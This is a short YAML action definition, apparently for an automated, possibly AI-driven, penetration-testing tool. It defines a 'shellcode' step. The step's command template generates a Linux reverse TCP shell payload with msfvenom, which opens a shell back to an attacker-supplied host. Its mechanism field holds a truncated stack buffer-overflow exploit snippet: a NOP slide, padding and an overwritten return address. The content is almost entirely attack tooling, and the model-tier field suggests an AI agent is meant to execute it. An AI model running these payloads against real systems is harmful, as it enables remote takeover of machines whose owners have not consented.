name: shellcode
category: binary
description: Custom shellcode generation
preconditions:
- has_target
parameters:
  target_ip: from_engagement.target_ip
command_template: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport}\
  \ -f python -b '\0'"
parser: generic_parser
expected_effects:
- action_completed
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: 'nop_slide = asm(''nop'') * (offset - len(shellcode)) payload = nop_slide
  + shellcode payload += b''A'' * (offset - len(payload))  # Adjust the payload size
  to exactly fill the buffer and overwrite EIP payload += p32(0xffffcfb4) # Supossing
  0xffffcfb4 wil'
hacktricks_ref: binary-exploitation/stack-overflow/stack-shellcode/README.md
